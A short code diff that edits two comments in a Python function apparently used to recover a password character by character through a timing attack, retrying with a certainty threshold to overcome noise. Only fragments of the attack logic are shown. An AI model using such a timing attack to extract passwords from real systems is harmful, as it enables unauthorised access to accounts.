@@ -33,7 +33,7 @@ def get_password(oracle_query, chars, log):
         log.log(f"Current password: '{current_password}'", 0)
 
         # test if (current_password + char) is valid, then return
-        # this step is necessary, as we always append another char ('-') to the password to perform the timing attack
+        # this step is necessary, as we always append another char '-' to the password to perform the timing attack
         probable_chars = test_chars((oracle_query, current_password, char) for char in chars)
         if any(probable_chars):
             return current_password + chr(max(probable_chars))
@@ -41,7 +41,7 @@ def get_password(oracle_query, chars, log):
         certainty = 0
         most_common_char = ''
         # if there is no clear winner char (due to noise) we need to try again
-        # i have set this threshold to 50% (arbitrary value that seems to work)
+        # I have set this threshold to 50% (arbitrary value that seems to work)
         while certainty < 0.5:
 
             if len(most_common_char) > 0:
